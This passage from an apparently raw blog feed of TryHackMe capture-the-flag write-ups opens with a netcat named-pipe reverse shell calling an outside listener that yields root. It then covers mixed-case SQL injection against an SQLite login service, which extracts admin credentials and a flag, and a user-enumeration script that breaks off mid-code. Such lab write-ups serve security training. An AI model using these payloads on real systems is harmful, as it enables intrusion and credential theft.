sudo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.21.112.161 5555 &gt;/tmp/f&quot; &gt; /home/jack/id.sh&lt;/code&gt;. Before executing the command I have to open a NetCat (NC) listener on port 5555 matching the payload port number.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;&lt;b&gt;$&lt;/b&gt; nc -lvnp 5555&lt;br&gt;listening on [any] 5555 ...&lt;br&gt;connect to [10.21.112.161] from (UNKNOWN) [10.10.247.245] 38362&lt;br&gt;/bin/sh: 0: can&apos;t access tty; job control turned off&lt;br&gt;# whoami&lt;br&gt;root&lt;br&gt;# cat /root/root.txt&lt;br&gt;d89d5391984c0450a95497153ae7ca3a  &lt;/pre&gt;&lt;/p&gt;</content>
        
          <category term="easy"/>
        
          <category term="ctf"/>
        
          <category term="oscp"/>
        
          <category term="box"/>
        
          <category term="thm"/>
        
          <category term="web"/>
        
          <category term="nsfvenom"/>
        
          <category term="linux"/>
        
          <category term="privesc"/>
        
          <category term="login panel"/>
        
          <category term="nc"/>
        
          <category term="rce"/>
        
          <category term="reverse shell"/>
        
          <category term="upgrade shell"/>
        
          <category term="user enumeration"/>
        
      </item>
    
      <item>
        <title>Lightroom</title>
        <link href="https://benwick921.github.io/cyber/writeup/lightroom/" rel="alternate" type="text/html" title="Lightroom"/>
        <guid>https://benwick921.github.io/cyber/writeup/lightroom/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/lightroom/banner.gif&quot; alt=&quot;&quot;&gt;&lt;p&gt;&lt;pre&gt;# Nmap 7.94SVN scan initiated Thu Jan 30 15:28:56 2025 as: nmap -sC -sV -oA namp -p- 10.10.97.2&lt;br&gt;Nmap scan report for 10.10.97.2&lt;br&gt;Host is up (0.040s latency).&lt;br&gt;Not shown: 65533 closed tcp ports (conn-refused)&lt;br&gt;PORT     STATE SERVICE VERSION&lt;br&gt;22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)&lt;br&gt;| ssh-hostkey: &lt;br&gt;|   3072 61:c5:06:f2:4a:20:5b:cd:09:4d:72:b0:a5:aa:ce:71 (RSA)&lt;br&gt;|   256 51:e0:5f:fa:81:64:d3:d9:26:24:16:ca:45:94:c2:00 (ECDSA)&lt;br&gt;|_  256 77:e1:36:3b:95:9d:e0:3e:0a:56:82:b2:9d:4c:fe:1a (ED25519)&lt;br&gt;1337/tcp open  waste?&lt;br&gt;| fingerprint-strings: &lt;br&gt;|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: &lt;br&gt;|     Welcome to the Light database!&lt;br&gt;|     Please enter your username:&lt;br&gt;|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: &lt;br&gt;|     Welcome to the Light database!&lt;br&gt;|     Please enter your username: Username not found.&lt;br&gt;|_    Please enter your username:&lt;br&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;br&gt;SF-Port1337-TCP:V=7.94SVN%I=7%D=1/30%Time=679BE12E%P=x86_64-pc-linux-gnu%r&lt;br&gt;SF:(NULL,3B,&quot;Welcome\x20to\x20the\x20Light\x20database!
Please\x20enter\x&lt;br&gt;SF:20your\x20username:\x20&quot;)%r(GenericLines,6B,&quot;Welcome\x20to\x20the\x20Li&lt;br&gt;SF:ght\x20database!
Please\x20enter\x20your\x20username:\x20Username\x20n&lt;br&gt;SF:ot\x20found\.
Please\x20enter\x20your\x20username:\x20&quot;)%r(GetRequest,&lt;br&gt;SF:6B,&quot;Welcome\x20to\x20the\x20Light\x20database!
Please\x20enter\x20your&lt;br&gt;SF:\x20username:\x20Username\x20not\x20found\.
Please\x20enter\x20your\x2&lt;br&gt;SF:0username:\x20&quot;)%r(HTTPOptions,6B,&quot;Welcome\x20to\x20the\x20Light\x20dat&lt;br&gt;SF:abase!
Please\x20enter\x20your\x20username:\x20Username\x20not\x20foun&lt;br&gt;SF:d\.
Please\x20enter\x20your\x20username:\x20&quot;)%r(RTSPRequest,6B,&quot;Welco&lt;br&gt;SF:me\x20to\x20the\x20Light\x20database!
Please\x20enter\x20your\x20usern&lt;br&gt;SF:ame:\x20Username\x20not\x20found\.
Please\x20enter\x20your\x20username&lt;br&gt;SF::\x20&quot;)%r(RPCCheck,3B,&quot;Welcome\x20to\x20the\x20Light\x20database!
Plea&lt;br&gt;SF:se\x20enter\x20your\x20username:\x20&quot;)%r(DNSVersionBindReqTCP,3B,&quot;Welco&lt;br&gt;SF:me\x20to\x20the\x20Light\x20database!
Please\x20enter\x20your\x20usern&lt;br&gt;SF:ame:\x20&quot;)%r(DNSStatusRequestTCP,3B,&quot;Welcome\x20to\x20the\x20Light\x20d&lt;br&gt;SF:atabase!
Please\x20enter\x20your\x20username:\x20&quot;)%r(Help,6B,&quot;Welcome&lt;br&gt;SF:\x20to\x20the\x20Light\x20database!
Please\x20enter\x20your\x20usernam&lt;br&gt;SF:e:\x20Username\x20not\x20found\.
Please\x20enter\x20your\x20username:\&lt;br&gt;SF:x20&quot;)%r(SSLSessionReq,3B,&quot;Welcome\x20to\x20the\x20Light\x20database!
P&lt;br&gt;SF:lease\x20enter\x20your\x20username:\x20&quot;)%r(TerminalServerCookie,3B,&quot;We&lt;br&gt;SF:lcome\x20to\x20the\x20Light\x20database!
Please\x20enter\x20your\x20us&lt;br&gt;SF:ername:\x20&quot;)%r(TLSSessionReq,3B,&quot;Welcome\x20to\x20the\x20Light\x20data&lt;br&gt;SF:base!
Please\x20enter\x20your\x20username:\x20&quot;)%r(Kerberos,3B,&quot;Welcom&lt;br&gt;SF:e\x20to\x20the\x20Light\x20database!
Please\x20enter\x20your\x20userna&lt;br&gt;SF:me:\x20&quot;)%r(SMBProgNeg,3B,&quot;Welcome\x20to\x20the\x20Light\x20database!
&lt;br&gt;SF:Please\x20enter\x20your\x20username:\x20&quot;)%r(X11Probe,3B,&quot;Welcome\x20to&lt;br&gt;SF:\x20the\x20Light\x20database!
Please\x20enter\x20your\x20username:\x20&lt;br&gt;SF:&quot;)%r(FourOhFourRequest,6B,&quot;Welcome\x20to\x20the\x20Light\x20database!
&lt;br&gt;SF:Please\x20enter\x20your\x20username:\x20Username\x20not\x20found\.
Ple&lt;br&gt;SF:ase\x20enter\x20your\x20username:\x20&quot;);&lt;br&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;br&gt;&lt;br&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;br&gt;# Nmap done at Thu Jan 30 15:32:09 2025 -- 1 IP address (1 host up) scanned in 192.67 seconds&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;I have two services: port 22 SSH,  and 1337 TCP. The next step is to enumerate each of them with lots of patient. My first scan was a standard scan &lt;code&gt;nmap -sC -sV -oN nmap 10.10.97.2&lt;/code&gt; but this can revealed only port 22 ssh, so I did a more comprehensive scan adding the flag &lt;i&gt;-p-&lt;/i&gt; to scall all the ports.&lt;/p&gt;&lt;p&gt;The only port that is worth enumeration at this stage is 1337, additionally the challenges gives me some informmation about how to interact with this service.&lt;/p&gt;&lt;p&gt;&lt;blockquote&gt;You can connect to it using &lt;code&gt;nc MACHINE_IP 1337&lt;/code&gt;. You can use the username &lt;b&gt;smokey&lt;/b&gt; in order to get started.&lt;/blockquote&gt;&lt;/p&gt;&lt;p&gt;Once connected the first thing I have is a prompt that says Welcome to Light database, and it feels like a hint... the next prompt tells me to enter a username.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ nc 10.10.37.110 1337&lt;br&gt;Welcome to the Light database!&lt;br&gt;Please enter your username: &lt;/pre&gt;&lt;/p&gt;&lt;p&gt;As suggested by the challenge description entering the username smokey tells me his password.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ nc 10.10.37.110 1337&lt;br&gt;Welcome to the Light database!&lt;br&gt;Please enter your username: smokey&lt;br&gt;Password: vYQ5ngPpw8AdUmL&lt;br&gt;Please enter your username:&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Now that I know how to interact with the service I need to exploit it and the only attack that came into my mind at the time of doing the box was the SQL Injection (SQLi). Also searching for lightweight database on Google I have a list of lightweight databases and among them, there is one in particular that catches my interest.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/lightroom/dbsearch.jpg&quot; alt=&quot;&quot;&gt;&lt;p&gt;As I was not able to verify that it was actually SQLite from this point I proceeded assuming it was SQLite and I will use table and schemas for SQLite hoping it will work. If it doesent I will have to try a different one...&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lightroom/fingercrossed.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;My first attempt was some SQL Injection query from Wikipedia and it&apos;s showing the following queries.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;&apos; OR &apos;1&apos;=&apos;1&apos; --&lt;br&gt;&apos; OR &apos;1&apos;=&apos;1&apos; {&lt;br&gt;&apos; OR &apos;1&apos;=&apos;1&apos; /* &lt;/pre&gt;&lt;/p&gt;&lt;p&gt;By entering the first query I received an error message &quot;&lt;i&gt;For strange reasons I can&apos;t explain, any input containing /*, -- or, %0b is not allowed :)&lt;/i&gt;&quot; so my first idea was to try without the &quot;--&quot; which is a comment statement. Now the application is giving me a different error, &quot;&lt;i&gt;Error: unrecognized token: &quot;&apos;1&apos;&apos; LIMIT 30&lt;/i&gt;&quot;.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;Please enter your username: smokey &apos; or &apos;1&apos; = &apos;1&apos; --&lt;br&gt;For strange reasons I can&apos;t explain, any input containing /*, -- or, %0b is not allowed :)&lt;br&gt;Please enter your username: smokey &apos; or &apos;1&apos; = &apos;1&apos;&lt;br&gt;Error: unrecognized token: &quot;&apos;1&apos;&apos; LIMIT 30&quot;&lt;br&gt;Please enter your username:&lt;/pre&gt;&lt;/p&gt;LIMIT is a SQL clause that tells the number of rows to output, and the main thing to note here is the number of single quotes in the message! There are 3! an extra one.&lt;p&gt;At this point, I can try to guess how is the original query being executed behind the scenes. &lt;code&gt;SELECT [columnName] FROM [tableName] WHERE [columnNmae] = &apos;[userinput]&apos; LIMIT 30&lt;/code&gt; where &lt;b&gt;columnName&lt;/b&gt; can be something like &lt;i&gt;user&lt;/i&gt;, &lt;i&gt;username&lt;/i&gt; or just &lt;i&gt;name&lt;/i&gt;.&lt;/p&gt;&lt;p&gt;Now the error was caused because my input contained an extra single quote that was added to the final query making it syntactically wrong. Let&apos;s assume the column name is &lt;b&gt;username&lt;/b&gt; and the table name is &lt;b&gt;users&lt;/b&gt; for this example.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lightroom/sqli1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;That extra quote I inserted as giving me the syntax error. So to meke it syntacttically correct I have to remove it from my malicious query.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;Please enter your username: smokey &apos; or &apos;1&apos; = &apos;1&lt;br&gt;Password: tF8tj2o94WE4LKC&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Now it is working as intended, with no syntax error. But why is it working?&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lightroom/sqli2.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Time to retrieve the admin&apos;s password assuming there is an admin user. Let&apos;s test and see what the application says, it may give me more information about the application&apos;s behaviour.&lt;/p&gt;&lt;p&gt;It is still giving me the same password!&lt;/p&gt;&lt;p&gt;&lt;pre&gt;Please enter your username: admin &apos; or &apos;1&apos; = &apos;1&lt;br&gt;Password: tF8tj2o94WE4LKC&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;This is because the user &quot;admin&quot; does not exist in the database so the first part of the query fails and the cond part passes &lt;i&gt;FALSR or TRUE = TRUE&lt;/i&gt; but when TRUE is given in a query it returns all the occurrences, being &lt;i&gt;smokey&lt;/i&gt; the only entry of the table it returns the same password.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lightroom/sqli3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;At this point I have to try different type of SQL Injections. By searching for different types of SQL Injection on Google this &lt;a href=&quot;https://www.imperva.com/learn/application-security/sql-injection-sqli/&quot;&gt;page&lt;/a&gt; came out. From the list thanks to my experience I can tell the most suitable type would be the Union base SQL Injection.&lt;/p&gt;&lt;p&gt;I tried different types of Union-based SQLi, and none of them worked due to the input check.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;Please enter your username: &apos; or 1=1; --&lt;br&gt;For strange reasons I can&apos;t explain, any input containing /*, -- or, %0b is not allowed :)&lt;br&gt;Please enter your username: admin SELECT * FROM all_tables&lt;br&gt;Ahh there is a word in there I don&apos;t like :(&lt;br&gt;Please enter your username: admin &apos; or UNION ALL SELECT NULL,version()--&lt;br&gt;For strange reasons I can&apos;t explain, any input containing /*, -- or, %0b is not allowed :)&lt;br&gt;Please enter your username: admin &apos; UNION ALL SELECT NULL,version()  &lt;br&gt;Ahh there is a word in there I don&apos;t like :(&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;After a few tries by luck, I understood that there was a filter on SQL keywords that was bypassable by mixing capital letters. So instead of SELECT and UNION or all lowercase select and union, I had to write Select or uNion.&lt;/p&gt;&lt;p&gt;Now I need more inforamation about the database instead of trying to guess the table and column names.&lt;/p&gt;&lt;p&gt;Searching for &lt;a href=&quot;https://www.techonthenet.com/sqlite/sys_tables/index.php&quot;&gt;SQLite sytem table&lt;/a&gt; I found out the following tables:&lt;/p&gt;&lt;p&gt;&lt;b&gt;SQLite: System Tables&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;table&gt;  &lt;thead&gt;  &lt;tr&gt;&lt;th&gt;System Table&lt;/th&gt;&lt;th&gt;Description&lt;/th&gt;  &lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;sqlite_master&lt;/td&gt;&lt;td&gt;Master listing of all database objects in the database and the SQL used to create each object.&lt;/td&gt;  &lt;/tr&gt;  &lt;tr&gt;&lt;td&gt;sqlite_sequence&lt;/td&gt;&lt;td&gt;&lt;p&gt;Lists the last sequence number used for the AUTOINCREMENT column in a table.&lt;/p&gt;&lt;p&gt;The &lt;em&gt;sqlite_sequence&lt;/em&gt; table will only be created once an AUTOINCREMENT column has been defined in the database and at least one sequence number value has been generated and used in the database.&lt;/p&gt;&lt;/td&gt;  &lt;/tr&gt;  &lt;tr&gt;    &lt;td&gt;sqlite_stat1&lt;/td&gt;    &lt;td&gt;This table is created by the &lt;a href=&quot;/sqlite/analyze.php&quot;&gt;ANALYZE command&lt;/a&gt; to store statistical information about the tables and indexes analyzed. This information will be later used by the query optimizer.&lt;/td&gt;  &lt;/tr&gt;  &lt;/tbody&gt;&lt;/table&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;SQLite Master Table: sqlite_master&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;table&gt;  &lt;thead&gt;  &lt;tr&gt;    &lt;th&gt;Column Name&lt;/th&gt;    &lt;th&gt;Description&lt;/th&gt;  &lt;/tr&gt;  &lt;/thead&gt;  &lt;tbody&gt;  &lt;tr&gt;    &lt;td&gt;type&lt;/td&gt;    &lt;td&gt;The type of database object such as table, index, trigger or view.&lt;/td&gt;  &lt;/tr&gt;  &lt;tr&gt;    &lt;td&gt;name&lt;/td&gt;&lt;td&gt;The name of the database object.&lt;/td&gt;  &lt;/tr&gt;  &lt;tr&gt;    &lt;td&gt;tbl_name&lt;/td&gt;    &lt;td&gt;The table name that the database object is associated with.&lt;/td&gt;  &lt;/tr&gt;  &lt;tr&gt;&lt;td&gt;rootpage&lt;/td&gt;&lt;td&gt;Root page.&lt;/td&gt;&lt;/tr&gt;  &lt;tr&gt;&lt;td&gt;sql&lt;/td&gt;&lt;td&gt;SQL used to create the database object.&lt;/td&gt;&lt;/tr&gt;  &lt;/tbody&gt;&lt;/table&gt;&lt;/p&gt;&lt;p&gt;Now I can enumerate the tables in this database and the query used to create the table.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;Please enter your username: smokey &apos; Union Select tbl_name From sqlite_master Where type=&apos;table&lt;br&gt;Password: admintable&lt;br&gt;Please enter your username: smokey &apos; Union Select sql From sqlite_master Where type=&apos;table&lt;br&gt;Password: CREATE TABLE admintable (&lt;br&gt;                   id INTEGER PRIMARY KEY,&lt;br&gt;                   username TEXT,&lt;br&gt;                   password INTEGER)&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Now that I know the structure of this table I can craft specific query to extract the information in it.&lt;/p&gt;&lt;p&gt;After a few tries I came up with the following query to print the username to answer the first question.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;Please enter your username: smokey &apos; uNIon Select username fRom admintable WHere username Like &apos;%&lt;br&gt;Password: TryHackMeAdmin&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Q&lt;/b&gt;: &lt;i&gt;What is the admin username?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A&lt;/b&gt;: &lt;i&gt;TryHackMeAdmin&lt;/i&gt;&lt;/p&gt;&lt;p&gt;After confirming the table name and the column name I can craft the query to extract the passowrd&lt;/p&gt;&lt;p&gt;&lt;pre&gt;Please enter your username: smokey &apos; uNIon Select password fRom admintable WHere username=&apos;TryHackMeAdmin&lt;br&gt;Password: mamZtAuMlrsEy5bp6q17&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Q&lt;/b&gt;: &lt;i&gt;What is the password to the username mentioned in question 1?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A&lt;/b&gt;: &lt;i&gt;mamZtAuMlrsEy5bp6q17&lt;/i&gt;&lt;/p&gt;&lt;p&gt;To extract the flag after many attempts again doing random queries I wanted to print out everything in the table with the clause LIKE &apos;%&apos; as I was tired of extracting exactly the password. Why focusing extracting the password when I can extract everything in the table?&lt;/p&gt;&lt;p&gt;&lt;pre&gt;Please enter your username: smokey &apos; uNIon Select password fRom admintable WHere password Like &apos;%&lt;br&gt;Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Q&lt;/b&gt;: &lt;i&gt;What is the flag?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A&lt;/b&gt;: &lt;i&gt;THM{SQLit3_InJ3cTion_is_SimplE_nO?}&lt;/i&gt;&lt;/p&gt;</content>
        
          <category term="easy"/>
        
          <category term="ctf"/>
        
          <category term="box"/>
        
          <category term="thm"/>
        
          <category term="sql"/>
        
          <category term="sqlite"/>
        
      </item>
    
      <item>
        <title>Lookup</title>
        <link href="https://benwick921.github.io/cyber/writeup/lookup/" rel="alternate" type="text/html" title="Lookup"/>
        <guid>https://benwick921.github.io/cyber/writeup/lookup/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/lookup/banner.gif&quot; alt=&quot;&quot;&gt;&lt;p&gt;Description of found ports.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ nmap -sC -sV -oN nmap 10.10.14.33&lt;br&gt;Nmap scan report for 10.10.14.33&lt;br&gt;Host is up (0.032s latency).&lt;br&gt;Not shown: 998 closed tcp ports (conn-refused)&lt;br&gt;PORT   STATE SERVICE VERSION&lt;br&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)&lt;br&gt;| ssh-hostkey: &lt;br&gt;|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)&lt;br&gt;|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)&lt;br&gt;|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)&lt;br&gt;80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))&lt;br&gt;|_http-server-header: Apache/2.4.41 (Ubuntu)&lt;br&gt;|_http-title: Did not follow redirect to http://lookup.thm&lt;br&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;I have four services: port 22 SSH&lt; and HTTP 80 with Apache 2.4.41.&lt;/p&gt;&lt;p&gt;Trying to access the web page at port 80, gave me a &lt;i&gt;&quot;The connection has timed out&quot;&lt;/i&gt; error, for some reason, my browser was not able to reach the page. By searching for this error I found out that the application was redirecting to &lt;b&gt;lookup.htm&lt;/b&gt; and it was not possible to reach out until I added the host in &lt;i&gt;/etc/hosts&lt;i&gt;.&lt;/p&gt;&lt;p&gt;To do so I executed sudo vim &lt;i&gt;/etc/hosts&lt;/i&gt; and added 2 new entries in the file:&lt;br&gt;&lt;i&gt;10.10.114.228   files.lookup.thm&lt;br&gt;10.10.114.228   files.lookup.thm&lt;/i&gt;&lt;br&gt;now my &lt;i&gt;/etc/hosts&lt;/i&gt; looks like the following.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;127.0.0.1  localhost&lt;br&gt;127.0.1.1  kali&lt;br&gt;10.10.114.228   lookup.thm&lt;br&gt;10.10.114.228   files.lookup.thm&lt;br&gt;# The following lines are desirable for IPv6 capable hosts&lt;br&gt;::1   localhost ip6-localhost ip6-loopback&lt;br&gt;ff02::1 ip6-allnodes&lt;br&gt;ff02::2 ip6-allrouters&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Refreshing the page Im able to access the page.&lt;/p&gt;&lt;p&gt;The first I did was a directory bruteforce with gobuster: &lt;code&gt;gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://lookup.thm/ -x .php,.txt,.jsp,.xml | tee gobuster&lt;/code&gt;&lt;/p&gt;&lt;p&gt;the &lt;b&gt;-x&lt;/b&gt; indicate file extention to check and the command &lt;b&gt;tee&lt;/b&gt; redirects the output ot a file similarly to the &lt;b&gt;&amp;gt;&lt;/b&gt; but it also prints the command output in the terminal. The pages found by Gobuster are shown below:&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/gobuster.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Navigating to the IP address or to &lt;i&gt;lookup.thm&lt;/i&gt; I am presented with a login panel and I noticed that I am not in the &lt;i&gt;/login.php&lt;/i&gt; path, hmm...&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/loginurl.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;Analysing with BurpSuite&lt;/p&gt;&lt;p&gt;&lt;div class=&quot;http-request&quot;&gt;&lt;span class=&quot;method&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;path&quot;&gt;/login.php&lt;/span&gt; &lt;span class=&quot;version&quot;&gt;HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;header-key&quot;&gt;Host:&lt;/span&gt; &lt;span class=&quot;header-value&quot;&gt;lookup.thm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;header-key&quot;&gt;User-Agent:&lt;/span&gt;&lt;span class=&quot;header-value&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;header-key&quot;&gt;Accept:&lt;/span&gt; &lt;span class=&quot;header-value&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;header-key&quot;&gt;Accept-Language:&lt;/span&gt; &lt;span class=&quot;header-value&quot;&gt;en-US,en;q=0.5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;header-key&quot;&gt;Accept-Encoding:&lt;/span&gt; &lt;span class=&quot;header-value&quot;&gt;gzip, deflate, br&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;header-key&quot;&gt;Content-Type:&lt;/span&gt;&lt;span class=&quot;header-value&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;header-key&quot;&gt;Content-Length:&lt;/span&gt; &lt;span class=&quot;header-value&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;header-key&quot;&gt;Origin:&lt;/span&gt; &lt;span class=&quot;header-value&quot;&gt;http://lookup.thm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;header-key&quot;&gt;Connection:&lt;/span&gt; &lt;span class=&quot;header-value&quot;&gt;keep-alive&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;header-key&quot;&gt;Referer:&lt;/span&gt; &lt;span class=&quot;header-value&quot;&gt;http://lookup.thm/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;header-key&quot;&gt;Upgrade-Insecure-Requests:&lt;/span&gt; &lt;span class=&quot;header-value&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;body&quot;&gt;&lt;span class=&quot;post-key&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;post-value&quot;&gt;admin&lt;/span&gt;&amp;amp;&lt;span class=&quot;post-key&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;post-value&quot;&gt;admin&lt;/span&gt; &lt;/span&gt; &lt;/div&gt; &lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;Now at this point, I have tried different enumerations to gain as much information as possible, manually or using automated enumeration tools such as Gobuster or Nikto. One of my big mistakes was to assume that if there was no mention of any users on the website it meant I didn&apos;t have to enumerate them. This is because, in my past challenges, there were users mentioned on the website, and usually they were the users to compromise.&lt;/i&gt;&lt;/p&gt;&lt;p&gt;I tried different combinations of usernames and passwords starting from commonly used default credentials and random usernames and passwords. I noticed that when trying the username &lt;i&gt;admin&lt;/i&gt; I have a different error message. Normally by using random credentials the error message says &lt;b&gt;Wrong username or password. Please try again. Redirecting in 3 seconds.&lt;/b&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/erro1.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;While using &lt;i&gt;admin&lt;/i&gt; as a username, and a random password the error message changes to &lt;b&gt;Wrong password. Please try again. Redirecting in 3 seconds.&lt;/b&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/erro2.PNG&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;This means I can enumerate users and check what users are registered in the system, and then given a username I can bruteforce the password, maybe? To enumerate the users I wrote the following Python scripts that test usernames from a wordlist and check the result returned by the server. Also the erro message path is at &lt;i&gt;/login.php&lt;/i&gt; so the URL in the script is &lt;i&gt;http://lookup.thm/login.php/&lt;/i&gt; as this is the URL used to send the credentals. The headers are simplied copied fomr Burp&apos;s request.&lt;/p&gt;&lt;p&gt;&lt;pre class=&quot;python-code&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;#!/usr/bin/python&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; concurrent.futures &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; ThreadPoolExecutor, as_completed&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; sys&lt;br&gt;&lt;br&gt;&lt;span class=&quot;function&quot;&gt;url&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&apos;http://lookup.thm/login.php/&apos;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;userenum&lt;/span&gt;(username):&lt;br&gt;   headers = {&lt;br&gt;       &lt;span class=&quot;string&quot;&gt;&apos;User-Agent&apos;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&apos;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&apos;&lt;/span&gt;,&lt;br&gt;       &lt;span class=&quot;string&quot;&gt;&apos;Accept&apos;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&apos;&lt;/span&gt;,&lt;br&gt;       &lt;span class=&quot;string&quot;&gt;&apos;Accept-Language&apos;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&apos;en-US,en;q=0.5&apos;&lt;/span&gt;,&lt;br&gt;       &lt;span class=&quot;string&quot;&gt;&apos;Accept-Encoding&apos;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&apos;gzip, deflate, br&apos;&lt;/span&gt;,&lt;br&gt;       &lt;span class=&quot;string&quot;&gt;&apos;Content-Type&apos;&lt;/span&gt;: &lt;span 